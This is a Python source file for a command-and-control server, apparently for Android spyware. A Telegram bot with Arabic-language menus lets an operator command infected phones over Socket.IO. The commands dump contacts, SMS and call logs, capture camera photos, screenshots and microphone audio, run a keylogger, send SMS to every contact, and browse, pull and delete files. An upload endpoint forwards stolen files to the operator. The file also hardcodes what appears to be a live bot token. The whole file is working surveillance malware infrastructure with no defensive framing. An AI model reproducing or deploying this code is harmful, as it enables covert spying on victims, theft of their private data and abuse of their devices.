import os
import json
import asyncio
import threading
from datetime import datetime
from flask import Flask, request, send_from_directory
from flask_socketio import SocketIO, emit
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── Configuration ───────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8695504759:AAHP-4I6ny00lyAQmGOupPb8EiN5mSFf8VU")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", None)
PORT = int(os.environ.get("PORT", 5000))
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ─── Flask + SocketIO ────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["SECRET_KEY"] = "rainbow-secret"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent")

# ─── Device Registry ─────────────────────────────────────────────────────────
devices = {}  # sid -> {model, version, ip, connected_at}
selected_device = {}  # chat_id -> sid

# ─── Telegram Bot Setup ──────────────────────────────────────────────────────
bot = Bot(token=BOT_TOKEN)
tg_app = None
admin_chat_ids = set()


def get_selected_sid(chat_id):
    sid = selected_device.get(chat_id)
    if sid and sid in devices:
        return sid
    return None


def send_command_to_device(sid, request_name, extras=None):
    """Send a command to device via Socket.IO"""
    payload = {"request": request_name, "extras": extras or []}
    socketio.emit("commend", payload, to=sid)


def send_file_explorer_command(sid, request_name, extras=None):
    """Send file explorer command"""
    payload = {"request": request_name, "extras": extras or []}
    socketio.emit("file-explorer-cmd", payload, to=sid)


# ─── Socket.IO Events ────────────────────────────────────────────────────────
@socketio.on("connect")
def handle_connect():
    sid = request.sid
    model = request.args.get("model", "Unknown")
    version = request.args.get("version", "Unknown")
    ip = request.args.get("ip", request.remote_addr)
    devices[sid] = {
        "model": model,
        "version": version,
        "ip": ip,
        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    print(f"[+] Device connected: {model} ({ip}) - SID: {sid}")
    # Notify admin
    notify_admins(f"🟢 جهاز جديد متصل:\n📱 {model}\n📡 Android {version}\n🌐 {ip}")


@socketio.on("disconnect")
def handle_disconnect():
    sid = request.sid
    device = devices.pop(sid, None)
    if device:
        print(f"[-] Device disconnected: {device['model']} - SID: {sid}")
        notify_admins(f"🔴 جهاز انقطع:\n📱 {device['model']}\n🌐 {device['ip']}")
    # Remove from selections
    for chat_id in list(selected_device.keys()):
        if selected_device[chat_id] == sid:
            del selected_device[chat_id]


@socketio.on("message")
def handle_message(data):
    """Receive responses from device"""
    sid = request.sid
    device = devices.get(sid, {})
    model = device.get("model", "Unknown")
    if isinstance(data, str):
        text = data
    else:
        text = json.dumps(data, ensure_ascii=False, indent=2)
    notify_admins(f"📨 رد من {model}:\n{text[:4000]}")


@socketio.on("file-explorer")
def handle_file_explorer(data):
    """Receive file explorer responses"""
    sid = request.sid
    device = devices.get(sid, {})
    model = device.get("model", "Unknown")
    if isinstance(data, str):
        text = data
    else:
        text = json.dumps(data, ensure_ascii=False, indent=2)
    notify_admins(f"📁 ملفات من {model}:\n{text[:4000]}")


@socketio.on("pong")
def handle_pong(data=None):
    sid = request.sid
    device = devices.get(sid, {})
    model = device.get("model", "Unknown")
    notify_admins(f"🏓 Pong من {model}")


# ─── HTTP Upload Endpoint ────────────────────────────────────────────────────
@app.route("/upload/", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return "No file", 400
    f = request.files["file"]
    model = request.headers.get("model", "unknown")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{model}_{timestamp}_{f.filename}"
    filepath = os.path.join(UPLOAD_DIR, filename)
    f.save(filepath)
    print(f"[*] File uploaded: {filename}")
    # Send file to admin via Telegram
    send_file_to_admins(filepath, f"📎 ملف من {model}: {f.filename}")
    return "OK", 200


@app.route("/")
def index():
    return f"""
    <h1>Rainbow C2 Server</h1>
    <p>Status: Running</p>
    <p>Connected devices: {len(devices)}</p>
    <p>Socket.IO endpoint: /socket.io/</p>
    """


# ─── Telegram Notification Helpers ───────────────────────────────────────────
def notify_admins(text):
    """Send text notification to all admin chat IDs"""
    for chat_id in admin_chat_ids:
        try:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text=text),
                tg_loop
            )
        except Exception as e:
            print(f"Error notifying {chat_id}: {e}")


def send_file_to_admins(filepath, caption=""):
    """Send file to all admin chat IDs"""
    for chat_id in admin_chat_ids:
        try:
            asyncio.run_coroutine_threadsafe(
                _send_file(chat_id, filepath, caption),
                tg_loop
            )
        except Exception as e:
            print(f"Error sending file to {chat_id}: {e}")


async def _send_file(chat_id, filepath, caption):
    with open(filepath, "rb") as f:
        await bot.send_document(chat_id=chat_id, document=f, caption=caption[:1024])


# ─── Telegram Command Handlers ───────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    admin_chat_ids.add(chat_id)
    await update.message.reply_text(
        "🎛 مرحباً بك في لوحة تحكم Rainbow\n\n"
        "الأوامر المتاحة:\n"
        "/devices - عرض الأجهزة المتصلة\n"
        "/select - اختيار جهاز\n"
        "/contacts - جهات الاتصال\n"
        "/sms - الرسائل\n"
        "/calls - سجل المكالمات\n"
        "/apps - التطبيقات المثبتة\n"
        "/camera - كاميرا خلفية\n"
        "/selfie - كاميرا أمامية\n"
        "/screenshot - لقطة شاشة\n"
        "/clipboard - الحافظة\n"
        "/microphone - تسجيل صوت\n"
        "/keylogger_on - تشغيل Keylogger\n"
        "/keylogger_off - إيقاف Keylogger\n"
        "/gallery - صور المعرض\n"
        "/sendsms - إرسال SMS\n"
        "/smsall - SMS لجميع جهات الاتصال\n"
        "/toast - عرض Toast\n"
        "/vibrate - اهتزاز\n"
        "/playaudio - تشغيل صوت\n"
        "/stopaudio - إيقاف الصوت\n"
        "/notification - إشعار\n"
        "/ls - عرض الملفات\n"
        "/cd - الانتقال لمجلد\n"
        "/back - رجوع\n"
        "/upload - رفع ملف\n"
        "/delete - حذف ملف\n"
    )


async def cmd_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    admin_chat_ids.add(chat_id)
    if not devices:
        await update.message.reply_text("❌ لا توجد أجهزة متصلة حالياً")
        return
    text = "📱 الأجهزة المتصلة:\n\n"
    for i, (sid, info) in enumerate(devices.items(), 1):
        selected = " ✅" if selected_device.get(chat_id) == sid else ""
        text += f"{i}. {info['model']} | Android {info['version']} | {info['ip']}{selected}\n"
    text += "\nاستخدم /select لاختيار جهاز"
    await update.message.reply_text(text)


async def cmd_select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    admin_chat_ids.add(chat_id)
    if not devices:
        await update.message.reply_text("❌ لا توجد أجهزة متصلة")
        return
    keyboard = []
    for sid, info in devices.items():
        keyboard.append([InlineKeyboardButton(
            f"{info['model']} ({info['ip']})",
            callback_data=f"select_{sid}"
        )])
    await update.message.reply_text(
        "اختر جهازاً:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    data = query.data
    if data.startswith("select_"):
        sid = data[7:]
        if sid in devices:
            selected_device[chat_id] = sid
            info = devices[sid]
            await query.edit_message_text(f"✅ تم اختيار: {info['model']} ({info['ip']})")
        else:
            await query.edit_message_text("❌ الجهاز لم يعد متصلاً")


# ─── Simple Command Handlers ─────────────────────────────────────────────────
async def _send_cmd(update, cmd_name, extras=None):
    chat_id = update.effective_chat.id
    admin_chat_ids.add(chat_id)
    sid = get_selected_sid(chat_id)
    if not sid:
        await update.message.reply_text("❌ لم يتم اختيار جهاز. استخدم /select")
        return
    send_command_to_device(sid, cmd_name, extras)
    await update.message.reply_text(f"✅ تم إرسال الأمر: {cmd_name}")


async def cmd_contacts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "contacts")

async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "all-sms")

async def cmd_calls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "calls")

async def cmd_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "apps")

async def cmd_camera(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "main-camera")

async def cmd_selfie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "selfie-camera")

async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "screenshot")

async def cmd_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "clipboard")

async def cmd_microphone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    duration = "10"
    if context.args:
        duration = context.args[0]
    await _send_cmd(update, "microphone", [{"key": "duration", "value": duration}])

async def cmd_keylogger_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "keylogger-on")

async def cmd_keylogger_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "keylogger-off")

async def cmd_gallery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "gallery")

async def cmd_sendsms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("استخدم: /sendsms [رقم] [نص]")
        return
    number = context.args[0]
    text = " ".join(context.args[1:])
    await _send_cmd(update, "sendSms", [
        {"key": "number", "value": number},
        {"key": "text", "value": text}
    ])

async def cmd_smsall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /smsall [نص]")
        return
    text = " ".join(context.args)
    await _send_cmd(update, "smsToAllContacts", [{"key": "text", "value": text}])

async def cmd_toast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /toast [نص]")
        return
    text = " ".join(context.args)
    await _send_cmd(update, "toast", [{"key": "text", "value": text}])

async def cmd_vibrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    duration = "1000"
    if context.args:
        duration = context.args[0]
    await _send_cmd(update, "vibrate", [{"key": "duration", "value": duration}])

async def cmd_playaudio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /playaudio [رابط]")
        return
    url = context.args[0]
    await _send_cmd(update, "playAudio", [{"key": "url", "value": url}])

async def cmd_stopaudio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_cmd(update, "stopAudio")

async def cmd_notification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /notification [نص] [رابط اختياري]")
        return
    text = context.args[0] if len(context.args) >= 1 else ""
    url = context.args[1] if len(context.args) >= 2 else ""
    extras = [{"key": "text", "value": " ".join(context.args[:-1]) if url else " ".join(context.args)}]
    if url:
        extras.append({"key": "url", "value": url})
    await _send_cmd(update, "popNotification", extras)


# ─── File Explorer Commands ──────────────────────────────────────────────────
async def _send_fe_cmd(update, cmd_name, extras=None):
    chat_id = update.effective_chat.id
    admin_chat_ids.add(chat_id)
    sid = get_selected_sid(chat_id)
    if not sid:
        await update.message.reply_text("❌ لم يتم اختيار جهاز. استخدم /select")
        return
    send_file_explorer_command(sid, cmd_name, extras)
    await update.message.reply_text(f"✅ تم إرسال أمر الملفات: {cmd_name}")


async def cmd_ls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_fe_cmd(update, "ls")

async def cmd_cd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /cd [اسم المجلد]")
        return
    path = " ".join(context.args)
    await _send_fe_cmd(update, "cd", [{"key": "path", "value": path}])

async def cmd_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _send_fe_cmd(update, "back")

async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /upload [اسم الملف]")
        return
    filename = " ".join(context.args)
    await _send_fe_cmd(update, "upload", [{"key": "filename", "value": filename}])

async def cmd_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("استخدم: /delete [اسم الملف]")
        return
    filename = " ".join(context.args)
    await _send_fe_cmd(update, "delete", [{"key": "filename", "value": filename}])


# ─── Telegram Bot Runner ─────────────────────────────────────────────────────
tg_loop = None

def run_telegram_bot():
    global tg_app, tg_loop
    tg_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(tg_loop)

    tg_app = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    tg_app.add_handler(CommandHandler("start", cmd_start))
    tg_app.add_handler(CommandHandler("devices", cmd_devices))
    tg_app.add_handler(CommandHandler("select", cmd_select))
    tg_app.add_handler(CallbackQueryHandler(handle_callback))
    tg_app.add_handler(CommandHandler("contacts", cmd_contacts))
    tg_app.add_handler(CommandHandler("sms", cmd_sms))
    tg_app.add_handler(CommandHandler("calls", cmd_calls))
    tg_app.add_handler(CommandHandler("apps", cmd_apps))
    tg_app.add_handler(CommandHandler("camera", cmd_camera))
    tg_app.add_handler(CommandHandler("selfie", cmd_selfie))
    tg_app.add_handler(CommandHandler("screenshot", cmd_screenshot))
    tg_app.add_handler(CommandHandler("clipboard", cmd_clipboard))
    tg_app.add_handler(CommandHandler("microphone", cmd_microphone))
    tg_app.add_handler(CommandHandler("keylogger_on", cmd_keylogger_on))
    tg_app.add_handler(CommandHandler("keylogger_off", cmd_keylogger_off))
    tg_app.add_handler(CommandHandler("gallery", cmd_gallery))
    tg_app.add_handler(CommandHandler("sendsms", cmd_sendsms))
    tg_app.add_handler(CommandHandler("smsall", cmd_smsall))
    tg_app.add_handler(CommandHandler("toast", cmd_toast))
    tg_app.add_handler(CommandHandler("vibrate", cmd_vibrate))
    tg_app.add_handler(CommandHandler("playaudio", cmd_playaudio))
    tg_app.add_handler(CommandHandler("stopaudio", cmd_stopaudio))
    tg_app.add_handler(CommandHandler("notification", cmd_notification))
    tg_app.add_handler(CommandHandler("ls", cmd_ls))
    tg_app.add_handler(CommandHandler("cd", cmd_cd))
    tg_app.add_handler(CommandHandler("back", cmd_back))
    tg_app.add_handler(CommandHandler("upload", cmd_upload))
    tg_app.add_handler(CommandHandler("delete", cmd_delete))

    print("[*] Telegram bot started...")
    # Use initialize + start polling manually to avoid signal handler issues in threads
    async def _run_bot():
        await tg_app.initialize()
        await tg_app.updater.start_polling(drop_pending_updates=True)
        await tg_app.start()
        # Keep running
        while True:
            await asyncio.sleep(1)

    try:
        tg_loop.run_until_complete(_run_bot())
    except (KeyboardInterrupt, SystemExit):
        tg_loop.run_until_complete(tg_app.updater.stop())
        tg_loop.run_until_complete(tg_app.stop())
        tg_loop.run_until_complete(tg_app.shutdown())


# ─── Main ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # Start Telegram bot in a separate thread
    tg_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    tg_thread.start()

    print(f"[*] Server starting on port {PORT}...")
    socketio.run(app, host="0.0.0.0", port=PORT, debug=False)
